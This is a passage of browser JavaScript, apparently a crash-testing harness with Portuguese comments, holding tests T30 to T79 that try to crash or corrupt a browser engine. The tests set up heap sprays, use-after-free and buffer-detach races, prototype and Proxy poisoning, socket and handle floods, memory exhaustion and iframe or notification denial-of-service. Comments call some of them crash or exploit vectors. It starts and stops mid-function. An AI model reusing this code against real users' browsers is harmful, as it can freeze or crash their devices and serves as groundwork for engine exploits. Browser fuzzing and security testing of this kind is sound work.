            // Tenta conectar em IPs/Portas que seguram a conexão (SYN_SENT) ou falham lentamente
            img.src = "http://127.0.0.1:" + (portStart + i) + "/junk"; 
            imgs.push(img);
        }
        portStart += 20;
        
        if(imgs.length > 1000) {
            // Drop references without aborting via src="" to keep kernel socket open
            imgs = []; 
            imgs.length = 0;
        }
        
        if(portStart > 32000) {
            clearInterval(loop);
            log(">> T30: Socket flood finished.");
        }
    }, 50);
}
function runTest31() {
    log("Iniciando T31: XSLT Processor Recursion...");
    var xmlString = "<root>" + "<a>data</a>".repeat(100) + "</root>";
    var xslString = '<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">';
    xslString += '<xsl:for-each select="//a"><xsl:copy-of select="."/></xsl:for-each>';
    xslString += '</xsl:template></xsl:stylesheet>';
    
    try {
        var parser = new DOMParser();
        var xml = parser.parseFromString(xmlString, "text/xml");
        var xsl = parser.parseFromString(xslString, "text/xml");
        var processor = new XSLTProcessor();
        processor.importStylesheet(xsl);
        
        var f = document.createDocumentFragment();
        for(var i=0; i<500; i++) {
            var res = processor.transformToFragment(xml, document);
            f.appendChild(res);
            if(i % 100 === 0) {
                var spray = new Array(200).fill(1.1); 
            }
        }
        log(">> T31: XSLT Operations completed.");
    } catch(e) { log(">> T31 Erro: " + e.message); }
}

function runTest32() {
    log("Iniciando T32: MutationObserver Infinite Loop...");
    var target = document.createElement('div');
    document.body.appendChild(target);
    var count = 0;
    
    var obs = new MutationObserver(function(mutations) {
        count++;
        mutations.forEach(function(m) {
            var leak = document.createElement('span');
            leak.textContent = "L".repeat(100); 
            if(count < 2000) {
                target.setAttribute('data-x', count);
                target.appendChild(leak);
            }
        });
    });
    
    obs.observe(target, { attributes: true, childList: true, subtree: true });
    target.setAttribute('data-x', 'start');
    
    setTimeout(function() {
        obs.disconnect();
        target.innerHTML = "";
        document.body.removeChild(target);
        log(">> T32: Observer triggers triggered: " + count);
    }, 2000);
}

function runTest33() {
    log("Iniciando T33: Cross-Doc Node Adoption...");
    var doc1 = document.implementation.createHTMLDocument("doc1");
    var doc2 = document.implementation.createHTMLDocument("doc2");
    var nodePool = [];
    
    try {
        for(var i=0; i<500; i++) {
            var n = doc1.createElement('div');
            n.id = "node_" + i;
            doc1.body.appendChild(n);
            nodePool.push(n);
        }
        
        var iter = 0;
        var i = setInterval(function() {
            for(var j=0; j<50; j++) {
                if(nodePool.length > 0) {
                    var n = nodePool.shift();
                    doc2.adoptNode(n); 
                    doc2.body.appendChild(n);
                    
                    n.setAttribute("adopted", "true");
                    doc1.adoptNode(n); 
                }
            }
            iter++;
            if(iter > 20) {
                clearInterval(i);
                log(">> T33: Node adoption cycle finished.");
            }
        }, 50);
    } catch(e) { log(">> T33 Erro: " + e); }
}

function runTest34() {
    log("Iniciando T34: CSS Calc Deep Nesting...");
    var el = document.createElement('div');
    document.body.appendChild(el);
    var depth = 200;
    var style = "10px";
    
    for(var i=0; i<depth; i++) {
        style = "calc(1px + " + style + ")";
    }
    
    try {
        el.style.width = style;
        var computed = window.getComputedStyle(el).width;
        
        var styles = [];
        for(var k=0; k<1000; k++) {
            var d = document.createElement('div');
            d.style.width = style; 
            styles.push(d);
        }
        log(">> T34: CSS Calc Parse OK. Depth: " + depth);
    } catch(e) {
        log(">> T34 Parser Crash: " + e.message);
    }
    document.body.removeChild(el);
}

function runTest35() {
    log("Iniciando T35: RegExp Cache Poisoning...");
    var cache = [];
    try {
        for(var i=0; i<5000; i++) {
            var p = "(a|b|c)" + i + ".*[x-z]"; 
            var r = new RegExp(p);
            r.test("testing string for cache entry " + i);
            
            if(i % 100 === 0) {
                cache.push(r); 
            }
        }
        
        var stress = new RegExp("((a+)+)+");
        stress.exec("aaaaaaaaaaaaaaaaaaaaa"); 
        
        log(">> T35: RegExp Cache filled with " + i + " entries.");
    } catch(e) { log(">> T35 Erro: " + e); }
}

function runTest36() {
    log("Iniciando T36: Prototype Chain Bomb...");
    var root = {};
    var curr = root;
    var depth = 0;
    
    try {
        while(depth < 8000) {
            var next = {};
            Object.setPrototypeOf(curr, next);
            curr = next;
            depth++;
            if(depth % 1000 === 0) {
                curr.someProp = new Uint8Array(100).fill(1);
            }
        }
        var search = root.someProp; 
        log(">> T36: Proto Chain Depth: " + depth);
    } catch(e) {
        log(">> T36 Engine Limit: " + e.message);
    }
}

function runTest37() {
    log("Iniciando T37: Huge String Join (OOM)...");
    var parts = 200000;
    var filler = "A".repeat(1024); 
    
    try {
        var arr = new Array(parts);
        log(".. Allocating array elements...");
        for(var i=0; i<100; i++) arr[i] = filler; 
        
        log(".. Attempting Join...");
        var massive = arr.join("B"); 
        
        log(">> T37: Join Success (Len: " + massive.length + ")");
    } catch(e) {
        log(">> T37 Allocation Failed: " + e.message);
        var cleanup = new ArrayBuffer(1024*1024); 
    }
}

function runTest38() {
    log("Iniciando T38: Unaligned DataView Stress...");
    var buffer = new ArrayBuffer(0x10000); 
    var view = new DataView(buffer);
    var count = 0;
    
    try {
        for(var i=0; i<buffer.byteLength - 8; i+=1) { 
            view.setFloat64(i, 1.23456789, true);
            var v = view.getFloat64(i, true);
            
            if(i % 4096 === 4095) { 
                var pageCross = view.getInt32(i, true); 
                count++;
            }
        }
        var sprays = [];
        for(var k=0; k<1000; k++) sprays.push(new DataView(new ArrayBuffer(128)));
        
        log(">> T38: Unaligned ops: " + count + " pages crossed.");
    } catch(e) { log(">> T38 Erro: " + e); }
}

function runTest39() {
    log("Iniciando T39: Event Listener Exhaustion...");
    var el = document.createElement('button');
    var count = 0;
    var functions = [];
    
    try {
        for(var i=0; i<20000; i++) {
            var fn = function() { return i; };
            el.addEventListener('click', fn);
            functions.push(fn); 
            count++;
        }
        
        el.click(); 
        
        for(var j=0; j<functions.length; j++) {
            el.removeEventListener('click', functions[j]);
        }
        log(">> T39: Listeners added/removed: " + count);
    } catch(e) {
        log(">> T39 Resource Limit: " + e.message);
    }
}

function runTest40() {
    log("Iniciando T40: Null Object Property Spray...");
    var container = [];
    var spraySize = 50000;
    
    try {
        log(".. Creating null-proto objects...");
        for(var i=0; i<spraySize; i++) {
            var obj = Object.create(null);
            obj["p" + i] = i;
            obj["buffer"] = new ArrayBuffer(16);
            if(i % 2 === 0) obj["padding"] = "P".repeat(32);
            container.push(obj);
        }
        
        var finder = container[spraySize-1]["p" + (spraySize-1)];
        
        container = null; 
        var reclaim = new Uint32Array(1024*1024).fill(0xCC);
        
        log(">> T40: Objects sprayed: " + spraySize);
    } catch(e) { log(">> T40 Erro: " + e); }
}
function runTest41() {
    log("Iniciando T41: FontFaceSet UAF...");
    var f = new FontFace('t', 'url(data:font/woff;base64,d09GRgABAAAA...)');
    document.fonts.add(f);
    var arr = [];
    var spray = [];
    
    try {
        f.load().then(function() {
            document.fonts.delete(f);
            var b = new Uint8Array(200).fill(0x41);
        }, function(){});
        
        for(var i=0; i<1000; i++) {
            var face = new FontFace('f'+i, 'url(#)');
            document.fonts.add(face);
            arr.push(face);
            if(i % 50 === 0) {
                document.fonts.clear();
                spray.push(new ArrayBuffer(0x100)); 
            }
        }
        var it = document.fonts.keys();
        var next = it.next(); 
        log(">> T41: Font iterators stressed.");
    } catch(e) { log(">> T41 Erro: " + e.message); }
}

function runTest42() {
    log("Iniciando T42: Worker Transferable Race...");
    var workers = [];
    var buffers = [];
    
    for(var i=0; i<8; i++) { 
        var b = new Blob(["onmessage=function(e){postMessage(e.data, [e.data]);}"], {type:'application/javascript'});
        var w = new Worker(URL.createObjectURL(b));
        workers.push(w);
    }
    
    var interval = setInterval(function() {
        for(var j=0; j<workers.length; j++) {
            try {
                var buf = new ArrayBuffer(1024 * 1024);
                workers[j].postMessage(buf, [buf]);
                
                if(Math.random() > 0.8) {
                    workers[j].terminate();
                    workers[j] = new Worker(URL.createObjectURL(new Blob([""], {type:'js'})));
                }
            } catch(e) {}
        }
    }, 10);
    
    setTimeout(function() {
        clearInterval(interval);
        log(">> T42: Worker race finished.");
    }, 4000);
}

function runTest43() {
    log("Iniciando T43: NodeIterator Detach...");
    var root = document.createElement('div');
    root.innerHTML = "<span><a><b>text</b></a></span>".repeat(100);
    document.body.appendChild(root);
    
    var ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, null, false);
    var node;
    var count = 0;
    
    try {
        while((node = ni.nextNode())) {
            count++;
            if(count % 20 === 0) {
                var r = document.createRange();
                r.selectNode(node);
                r.deleteContents(); 
                
                var junk = document.createElement('div');
                junk.setAttribute('a', 'x'.repeat(1000));
                
                node.textContent = "A"; 
            }
        }
    } catch(e) { log(">> T43 Logic: " + e.message); }
    
    document.body.removeChild(root);
    log(">> T43: NodeIterator traversal attempted.");
}

function runTest44() {
    log("Iniciando T44: Array Splice Proxy Trap...");
    var a = [1, 2, 3, 4];
    var p = new Proxy(a, {
        get: function(target, prop) {
            if (prop === 'length') {
                target[1000] = 100; 
                var spray = [];
                for(var i=0; i<5000; i++) spray.push({a: 1, b: new Uint8Array(64)});
                return target.length;
            }
            return target[prop];
        }
    });
    
    try {
        Array.prototype.splice.call(p, 0, 1);
        log(">> T44: Splice executed on Proxy.");
    } catch(e) {
        log(">> T44 Crash Vector: " + e.message);
    }
}

function runTest45() {
    log("Iniciando T45: TextTrack Cue Invalidation...");
    var v = document.createElement('video');
    var t = v.addTextTrack("subtitles", "Test", "en");
    t.mode = "showing";
    var cues = [];
    
    try {
        for(var i=0; i<500; i++) {
            var c = new VTTCue(i, i+1, "Text " + i);
            t.addCue(c);
            cues.push(c);
        }
        
        for(var j=0; j<cues.length; j++) {
            t.removeCue(cues[j]);
            cues[j].text = "MODIFIED AFTER REMOVAL"; 
            cues[j].line = 5;
            
            if(j % 50 === 0) {
                var heavy = new Uint32Array(1024).fill(0xDEADBEEF);
            }
        }
        log(">> T45: Cues manipulated post-removal.");
    } catch(e) { log(">> T45 Erro: " + e.message); }
}

function runTest46() {
    log("Iniciando T46: Sync XHR Thread Lock...");
    var count = 0;
    var max = 50; 
    
    var t = setInterval(function() {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", window.location.href + "?nocache=" + Math.random(), false); 
            xhr.send(null);
            count++;
            
            if(count > max) {
                clearInterval(t);
                log(">> T46: Sync Requests sent: " + count);
            }
        } catch(e) {
            log(">> T46 Net Error: " + e.message);
        }
    }, 10); 
}

function runTest47() {
    log("Iniciando T47: History State Flood...");
    var junk = "A".repeat(1024 * 512); 
    var i = 0;
    
    try {
        while(i < 5000) {
            history.pushState({data: junk}, "S" + i, "/?s=" + i);
            i++;
            if(i % 100 === 0) {
                var f = document.createElement('div'); 
                f = null;
            }
        }
    } catch(e) {
        log(">> T47 Memory Limit/Crash: " + e.message);
    }
}

function runTest48() {
    log("Iniciando T48: Storage I/O Thrashing...");
    localStorage.clear();
    var val = "X".repeat(1024 * 50); 
    var running = true;
    
    setTimeout(function(){ running = false; log(">> T48: I/O Stop."); }, 4000);
    
    var loop = function() {
        if(!running) return;
        try {
            for(var i=0; i<50; i++) {
                localStorage.setItem("key"+i, val);
            }
            for(var i=0; i<50; i++) {
                localStorage.removeItem("key"+i);
            }
            setTimeout(loop, 0); 
        } catch(e) { log(">> T48 Erro: " + e.message); }
    };
    loop();
}

function runTest49() {
    log("Iniciando T49: Recursive Iframe Stack...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var depth = 0;
    
    function dive(parent) {
        depth++;
        if(depth > 500) return; 
        
        var ifr = document.createElement('iframe');
        parent.appendChild(ifr);
        
        try {
            var d = ifr.contentDocument;
            d.open();
            d.write("<div>Depth " + depth + "</div>");
            d.close();
            
            setTimeout(function() { dive(d.body); }, 0);
        } catch(e) {}
    }
    
    dive(container);
    log(">> T49: Recursion initiated.");
}

function runTest50() {
    log("Iniciando T50: URL Object Handle Leak...");
    var blobs = [];
    var urls = [];
    var data = new Uint8Array(1024).fill(1);
    
    var t = setInterval(function() {
        for(var i=0; i<500; i++) {
            var b = new Blob([data]);
            var u = URL.createObjectURL(b);
            urls.push(u); 
            
            if(urls.length % 10000 === 0) {
                log(".. Handles open: " + urls.length);
            }
        }
        
        if(urls.length > 100000) {
            clearInterval(t);
            log(">> T50: Handle exhaustion limit.");
        }
    }, 50);
}
function runTest51() {
    log("Iniciando T51: Document.write Re-entrancy...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var d = f.contentDocument;
    
    try {
        d.open();
        d.write('<script>parent.log(".. Frame Script Executing"); window.location.reload();<\/script>');
        
        var s = document.createElement('script');
        s.textContent = "document.write('<h1>OVERWRITTEN</h1>');";
        d.body.appendChild(s); 
        
        for(var i=0; i<100; i++) {
            d.write("<div>" + "A".repeat(1000) + "</div>");
            if(i === 50) {
                f.src = "about:blank"; 
                var junk = new Uint32Array(0x4000).fill(0x1337);
            }
        }
        d.close();
    } catch(e) { log(">> T51 Logic: " + e.message); }
    
    setTimeout(function() { 
        if(document.body.contains(f)) document.body.removeChild(f);
        log(">> T51: Write operations finished.");
    }, 2000);
}

function runTest52() {
    log("Iniciando T52: AdoptNode Getter Poison...");
    var docA = document.implementation.createHTMLDocument("A");
    var docB = document.implementation.createHTMLDocument("B");
    var div = docA.createElement("div");
    docA.body.appendChild(div);
    
    var poison = {
        get id() {
            if(div.parentNode) div.parentNode.removeChild(div);
            var spray = [];
            for(var k=0; k<1000; k++) spray.push(new Uint8Array(255).fill(0xCC)); 
            return "poison";
        }
    };
    
    try {
        Object.defineProperty(div, "id", poison);
        for(var i=0; i<500; i++) {
            var clone = docA.createElement("div");
            docA.body.appendChild(clone);
            docB.adoptNode(clone); 
        }
        docB.adoptNode(div); 
        log(">> T52: Adoption trap executed.");
    } catch(e) { log(">> T52 Erro: " + e.message); }
}

function runTest53() {
    log("Iniciando T53: RegExp Replace Mutation...");
    var str = "A".repeat(10000);
    var regex = /A/g;
    var count = 0;
    
    var victim = {
        toString: function() {
            count++;
            if(count % 100 === 0) {
                str = null; 
                var heavy = new ArrayBuffer(0x100000); 
                return "B";
            }
            return "A";
        }
    };
    
    try {
        regex.lastIndex = 5000;
        var res = str.replace(regex, victim);
        
        var check = [];
        for(var i=0; i<200; i++) check.push(res.substr(i*10, 10));
        
        log(">> T53: RegExp replace cycle done. Count: " + count);
    } catch(e) {
        log(">> T53 Crash Logic: " + e.message);
    }
}

function runTest54() {
    log("Iniciando T54: Prototype Hijack Spray...");
    var original = Node.prototype.appendChild;
    var count = 0;
    
    Node.prototype.appendChild = function(arg) {
        count++;
        if(count % 50 === 0) {
            var arr = new Array(100);
            for(var i=0; i<100; i++) arr[i] = document.createElement('span');
        }
        return original.apply(this, arguments);
    };
    
    try {
        var root = document.createElement('div');
        for(var j=0; j<2000; j++) {
            var el = document.createElement('div');
            root.appendChild(el); 
        }
        
        Node.prototype.appendChild = original; 
        log(">> T54: Hijack calls processed: " + count);
    } catch(e) {
        Node.prototype.appendChild = original;
        log(">> T54 Erro: " + e.message);
    }
}

function runTest55() {
    log("Iniciando T55: CSS Rule Insert Race...");
    var style = document.createElement('style');
    document.head.appendChild(style);
    var sheet = style.sheet;
    var running = true;
    
    setTimeout(function() { running = false; log(">> T55: Race stop."); }, 3000);
    
    function spam() {
        if(!running) return;
        try {
            for(var i=0; i<100; i++) {
                sheet.insertRule("#id" + i + " { color: red; }", 0);
                var rules = sheet.cssRules; 
                if(rules.length > 50) sheet.deleteRule(rules.length - 1);
            }
            // Força recalculo de estilo
            var x = document.body.offsetHeight;
            setTimeout(spam, 0);
        } catch(e) { log(">> T55 Error: " + e.message); }
    }
    spam();
}

function runTest56() {
    log("Iniciando T56: XHR FD Leak...");
    var reqs = [];
    var t = setInterval(function() {
        try {
            for(var i=0; i<20; i++) {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "/", true);
                xhr.send();
                reqs.push(xhr); 
            }
            if(reqs.length > 3500) {
                log(".. Active XHRs: " + reqs.length);
                if(reqs.length > 10000) clearInterval(t);
            }
        } catch(e) {
            clearInterval(t);
            log(">> T56 Kernel Limit: " + e.message);
        }
    }, 50);
}

function runTest57() {
    log("Iniciando T57: Recursive Blob Expansion...");
    var blobs = [new Blob(["start"], {type: "text/plain"})];
    
    try {
        for(var i=0; i<25; i++) { 
            var next = [];
            for(var j=0; j<blobs.length; j++) {
                next.push(new Blob([blobs[j], blobs[j]], {type: "application/octet-stream"}));
            }
            blobs = next;
            log(".. Level " + i + ": " + blobs.length + " blobs");
            
            if(i > 15) { 
               var u = URL.createObjectURL(blobs[0]); 
            }
        }
        log(">> T57: Exponential Blob created.");
    } catch(e) {
        log(">> T57 Memory Fail: " + e.message);
        blobs = null; 
    }
}

function runTest58() {
    log("Iniciando T58: Window Name Huge Alloc...");
    var base = "A".repeat(1024 * 1024); 
    var huge = "";
    
    try {
        log(".. Building string...");
        for(var i=0; i<50; i++) {
            huge += base;
        }
        window.name = huge; 
        
        var check = window.name.length;
        log(">> T58: Window.name set to " + check + " bytes.");
        
        history.pushState(null, huge.substring(0, 100), "#" + huge.substring(0, 1000));
        
    } catch(e) {
        log(">> T58 Alloc Fail: " + e.message);
    }
    window.name = ""; 
}

function runTest59() {
    log("Iniciando T59: Heap Priming Fragmentation...");
    var buffer = [];
    var primes = [4093, 8191, 16381, 32749, 65521]; 
    
    try {
        for(var i=0; i<5000; i++) {
            var size = primes[i % primes.length];
            var ab = new ArrayBuffer(size);
            var view = new Uint8Array(ab);
            view[0] = i & 0xFF;
            view[size-1] = 0xAA;
            
            buffer.push(ab);
            
            // Cria buracos na memória para dificultar alocação contígua do kernel
            if(i % 3 === 0) {
                buffer[i] = null;
            }
        }
        
        var tryHuge = new ArrayBuffer(1024 * 1024 * 64); 
        log(">> T59: Heap fragmented & huge alloc attempted.");
    } catch(e) {
        log(">> T59 OOM Triggered: " + e.message);
    }
}

function runTest60() {
    log("Iniciando T60: Iframe Srcdoc Thread Bomb...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var count = 0;
    
    var html = "<html><body><script>for(var i=0;i<10000;i++)Math.random();<\/script></body></html>";
    
    var i = setInterval(function() {
        for(var k=0; k<10; k++) {
            var ifr = document.createElement('iframe');
            ifr.srcdoc = html;
            container.appendChild(ifr);
            count++;
            
            if(count % 500 === 0) {
                container.innerHTML = ""; 
                log(".. Frames cycled: " + count);
            }
        }
        if(count > 5000) {
            clearInterval(i);
            log(">> T60: Thread bomb finished.");
        }
    }, 20);
}
function runTest61() {
    log("Iniciando T61: DataView Detach Race...");
    var ab = new ArrayBuffer(1024);
    var dv = new DataView(ab);
    var workerBlob = new Blob(['onmessage = function(e) { postMessage("pong"); }'], {type: 'application/javascript'});
    var w = new Worker(URL.createObjectURL(workerBlob));
    
    try {
        var race = setInterval(function() {
            w.postMessage(ab, [ab]); 
            try {
                dv.setInt32(0, 0x41414141); 
            } catch(e) {}
            
            if(ab.byteLength === 0) {
                ab = new ArrayBuffer(1024);
                dv = new DataView(ab);
                // Heap Spray para preencher o local liberado
                var spray = new Array(100).fill(new Uint8Array(1024));
            }
        }, 0);
        
        setTimeout(function() {
            clearInterval(race);
            w.terminate();
            log(">> T61: Race finished.");
        }, 3000);
    } catch(e) { log(">> T61 Error: " + e.message); }
}

function runTest62() {
    log("Iniciando T62: Promise Rejection Flood...");
    var count = 0;
    
    function rejector() {
        return new Promise(function(resolve, reject) {
            reject("Force Fail");
        });
    }
    
    var t = setInterval(function() {
        for(var i=0; i<100; i++) {
            rejector().catch(function(e) {
                count++;
                if(count % 1000 === 0) {
                   // Cria pressão no Microtask Queue
                   var junk = [];
                   for(var k=0; k<500; k++) junk.push({a:1}); 
                }
            });
        }
        if(count > 20000) {
            clearInterval(t);
            log(">> T62: Microtask queue stressed.");
        }
    }, 10);
}

function runTest63() {
    log("Iniciando T63: Object.defineProperty Loop...");
    var target = {};
    var i = 0;
    
    try {
        while(i < 5000) {
            var prop = "p" + i;
            Object.defineProperty(target, prop, {
                get: function() { 
                    var heavy = new Uint32Array(100).fill(0x12345678);
                    return i; 
                },
                configurable: true,
                enumerable: true
            });
            i++;
        }
        
        // Força enumeração massiva chamando todos os getters
        var keys = Object.keys(target);
        var sum = 0;
        for(var k in target) { sum += target[k]; }
        
        log(">> T63: Properties defined and accessed: " + i);
    } catch(e) {
        log(">> T63 Engine Limit: " + e.message);
    }
}

function runTest64() {
    log("Iniciando T64: Canvas Pattern Recursion...");
    var c = document.createElement('canvas');
    c.width = 100; c.height = 100;
    var ctx = c.getContext('2d');
    
    try {
        var pattern = ctx.createPattern(c, 'repeat');
        var arrays = [];
        
        for(var i=0; i<500; i++) {
            var c2 = document.createElement('canvas');
            c2.width = 100 + i; c2.height = 100;
            var ctx2 = c2.getContext('2d');
            ctx2.fillStyle = pattern;
            ctx2.fillRect(0,0,100,100);
            
            pattern = ctx.createPattern(c2, 'repeat'); 
            
            if(i % 50 === 0) {
                var imgData = ctx2.getImageData(0,0,10,10);
                arrays.push(imgData);
            }
        }
        log(">> T64: Pattern recursion depth reached.");
    } catch(e) {
        log(">> T64 Graphics Fail: " + e.message);
    }
}

function runTest65() {
    log("Iniciando T65: Filter Function Context Swap...");
    var arr = new Array(10000).fill(1);
    var count = 0;
    
    var proxy = new Proxy({}, {
        get: function(t, k) { return 1; },
        has: function(t, k) {
            arr.length = 0; 
            var spray = new Array(5000).fill(1.1);
            return true;
        }
    });
    
    try {
        arr.filter(function(element, index, array) {
            count++;
            if(index === 500) {
                // Troca o contexto 'this' no meio da execução
                arguments[2] = proxy; 
                var x = array[index+1]; 
            }
            return true;
        }, proxy);
        log(">> T65: Filter survived. Count: " + count);
    } catch(e) { log(">> T65 Error: " + e.message); }
}

function runTest66() {
    log("Iniciando T66: Huge ArrayBuffer Map Fail...");
    var buffers = [];
    var totalAlloc = 0;
    
    try {
        var loop = setInterval(function() {
            // Tenta alocar blocos de 128MB (pode falhar no kernel mapping)
            var size = 1024 * 1024 * 128; 
            var ab = new ArrayBuffer(size);
            var view = new Uint8Array(ab);
            view[0] = 1; 
            view[size-1] = 1;
            
            buffers.push(ab);
            totalAlloc += 128;
            log(".. Alloc: " + totalAlloc + " MB");
            
            if(totalAlloc > 3000) { // Tenta passar de 3GB (limite usual de userland)
                clearInterval(loop);
                log(">> T66: Userland memory limit hit.");
            }
        }, 500);
    } catch(e) {
        log(">> T66 OOM Panic: " + e.message);
    }
}

function runTest67() {
    log("Iniciando T67: Iframe Reload Storm...");
    var f = document.createElement('iframe');
    document.body.appendChild(f);
    var count = 0;
    
    var t = setInterval(function() {
        f.src = window.location.href + "?storm=" + Math.random();
        count++;
        
        if(count % 20 === 0) {
            // Cria garbage no history stack
            history.replaceState(null, null, "/?r=" + count);
        }
        
        if(count > 200) {
            clearInterval(t);
            document.body.removeChild(f);
            log(">> T67: Reload storm stop.");
        }
    }, 15); // Reload muito rápido
}

function runTest68() {
    log("Iniciando T68: Notification API DoS...");
    var notes = [];
    
    if(!("Notification" in window)) {
        log(">> T68: API não suportada.");
        return;
    }
    
    try {
        var spam = setInterval(function() {
            var n = new Notification("CRASH TEST " + Math.random(), {
                body: "A".repeat(1000),
                icon: "http://localhost/junk.png"
            });
            notes.push(n);
            
            // Tenta fechar e reabrir rapidamente para estressar o daemon de UI
            if(notes.length > 50) {
                var old = notes.shift();
                old.close();
            }
            
            if(notes.length > 500) clearInterval(spam);
        }, 10);
    } catch(e) {
        log(">> T68 Error: " + e.message);
    }
}

function runTest69() {
    log("Iniciando T69: GPU Shader Compiler Hang...");
    var c = document.createElement('canvas');
    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    
    if(!gl) {
        log(">> T69: WebGL desabilitado (Esperado). Tentando Canvas 2D Path complexo.");
        // Fallback para Canvas 2D Path Storm
        var ctx = c.getContext('2d');
        ctx.beginPath();
        for(var i=0; i<100000; i++) {
            ctx.rect(i%100, i%100, 1, 1);
        }
        ctx.clip(); // Clip complexo é pesado
        ctx.fill();
        log(">> T69: 2D Path Clip enviado.");
        return;
    }
    // Caso WebGL esteja ativo por algum motivo (exploit vector raro)
    log(">> T69: WebGL active?!?");
}

function runTest70() {
    log("Iniciando T70: WebSQL Transaction Lock...");
    if(!window.openDatabase) {
        log(">> T70: WebSQL não suportado.");
        return;
    }
    
    var db = openDatabase('crashDB', '1.0', 'Crash Test', 2 * 1024 * 1024);
    var tables = 0;
    
    function flood() {
        db.transaction(function(tx) {
            for(var i=0; i<500; i++) {
                tx.executeSql('CREATE TABLE IF NOT EXISTS t'+tables+' (id unique, log)');
                tx.executeSql('INSERT INTO t'+tables+' (id, log) VALUES (1, "'+ "x".repeat(1000) +'")');
                tables++;
            }
            // Recursão dentro da transação para travar o thread SQL
            if(tables < 5000) setTimeout(flood, 0);
            else log(">> T70: SQL Flood sent.");
        });
    }
    flood();
}
function runTest71() {
    log("Iniciando T71: Array Constructor Poison...");
    var original = Array.prototype.constructor;
    var count = 0;
    
    var p = new Proxy(Array, {
        construct: function(target, args) {
            count++;
            if(count % 50 === 0) {
                var junk = new Uint32Array(1024).fill(0x1337);
                return { length: 0xFFFFFFFF }; 
            }
            return new target(...args);
        }
    });
    
    try {
        var a = new p(10);
        var b = Array.from({length: 1000}, (v, k) => k); 
        
        b.constructor = p;
        var c = b.slice(0, 500);
        
        log(">> T71: Poisoned slice executed.");
    } catch(e) {
        log(">> T71 Logic Error: " + e.message);
    }
}

function runTest72() {
    log("Iniciando T72: Function Bind Recursion...");
    var fn = function() { return 1; };
    var bound = fn;
    
    try {
        for(var i=0; i<50000; i++) {
            bound = bound.bind(null, i);
        }
        log(".. Binding depth: 50000");
        
        var res = bound();
        log(">> T72: Execution survived depth.");
    } catch(e) {
        log(">> T72 Stack Limit: " + e.message);
    }
}

function runTest73() {
    log("Iniciando T73: JSON Cyclic Stringify...");
    var a = {};
    var b = {parent: a};
    a.child = b;
    
    var replacer = function(key, value) {
        if(key === 'parent') {
            var leak = new Array(1000).fill(1.1);
            return value; 
        }
        return value;
    };
    
    try {
        // Tenta enganar a detecção de ciclo manipulando o objeto durante o stringify
        var s = JSON.stringify(a, replacer);
        log(">> T73: Stringify completed (Unexpected).");
    } catch(e) {
        log(">> T73 Cycle Detected/Crash: " + e.message);
        var cleanup = new ArrayBuffer(0x10000);
    }
}

function runTest74() {
    log("Iniciando T74: Accessor Property Stack...");
    var obj = {};
    var depth = 0;
    
    function makeGetter(prev) {
        return function() {
            depth++;
            var x = new Uint8Array(16); 
            return prev.val + 1;
        };
    }
    
    var curr = {val: 1};
    for(var i=0; i<3000; i++) {
        var next = {};
        Object.defineProperty(next, 'val', {
            get: makeGetter(curr),
            configurable: true
        });
        curr = next;
    }
    
    try {
        var res = curr.val;
        log(">> T74: Accessor chain depth: " + depth);
    } catch(e) { log(">> T74 Limit: " + e.message); }
}

function runTest75() {
    log("Iniciando T75: WebKit URL Parser Overflow...");
    var base = "http://a.com/";
    var huge = "x".repeat(0x10000); 
    var urls = [];
    
    try {
        for(var i=0; i<50; i++) {
            var u = new URL(huge, base);
            u.username = "user" + "A".repeat(5000);
            u.password = "pass" + "B".repeat(5000);
            u.search = "?q=" + "C".repeat(5000);
            u.hash = "#" + "D".repeat(5000);
            urls.push(u.href);
            
            if(i % 10 === 0) {
                var check = u.toString();
                if(check.length < 100) throw "Truncated";
            }
        }
        log(">> T75: URL parsing stress done.");
    } catch(e) { log(">> T75 Erro: " + e.message); }
}

function runTest76() {
    log("Iniciando T76: Canvas Pixel Manipulation...");
    var c = document.createElement('canvas');
    c.width = 4096; c.height = 4096; 
    var ctx = c.getContext('2d');
    
    if(!ctx) { log(">> T76: Context failed."); return; }
    
    try {
        // Aloca buffer massivo para putImageData (4096*4096*4 bytes = ~64MB)
        var arr = new Uint8ClampedArray(4096 * 4096 * 4);
        arr.fill(255);
        var imgData = new ImageData(arr, 4096, 4096);
        
        for(var i=0; i<10; i++) {
            ctx.putImageData(imgData, 0, 0); 
            var sub = ctx.getImageData(100, 100, 2000, 2000); 
            log(".. Cycle " + i + " GPU memory hit");
        }
        log(">> T76: Large Pixel Buffer operations done.");
    } catch(e) {
        log(">> T76 OOM: " + e.message);
    }
}

function runTest77() {
    log("Iniciando T77: TextEncoder Memory Spike...");
    var enc = new TextEncoder();
    var chunk = "A".repeat(1024 * 1024); 
    var arr = [];
    
    try {
        for(var i=0; i<200; i++) {
            // Encode cria Uint8Array nativo. Fazer isso rápido fragmenta o heap.
            var u8 = enc.encode(chunk + i);
            arr.push(u8);
            
            // Força liberar a cada 50MB para causar "churn"
            if(arr.length > 50) {
                arr = [];
                var hole = new ArrayBuffer(1024 * 512); 
            }
        }
        log(">> T77: Encoding churn finished.");
    } catch(e) { log(">> T77 Crash: " + e.message); }
}

function runTest78() {
    log("Iniciando T78: DOM Deep Clone...");
    var root = document.createElement('div');
    var curr = root;
    for(var i=0; i<2000; i++) {
        var el = document.createElement('div');
        el.setAttribute('data-id', i);
        curr.appendChild(el);
        curr = el;
    }
    
    try {
        var clones = [];
        for(var k=0; k<50; k++) {
            var c = root.cloneNode(true); 
            clones.push(c);
            if(k % 10 === 0) log(".. Clone " + k);
        }
        clones = null; 
        log(">> T78: Deep cloning stress passed.");
    } catch(e) {
        log(">> T78 Stack/Mem Error: " + e.message);
    }
}

function runTest79() {
    log("Iniciando T79: Huge Scroll Event Flood...");
    var d = document.createElement('div');
    d.style.height = "50000px";
    d.style.overflow = "scroll";
    document.body.appendChild(d);
    
    var count = 0;
    d.addEventListener('scroll', function() {
        count++;
        // Heavy logic inside high-frequency event
        var m = new Float32Array(1000);
        for(var j=0; j<1000; j++) m[j] = Math.random();
    });
    
    var t = setInterval(function() {
        d.scrollTop = Math.random() * 50000;
        if(count > 2000) {
            clearInterval(t);
            document.body.removeChild(d);
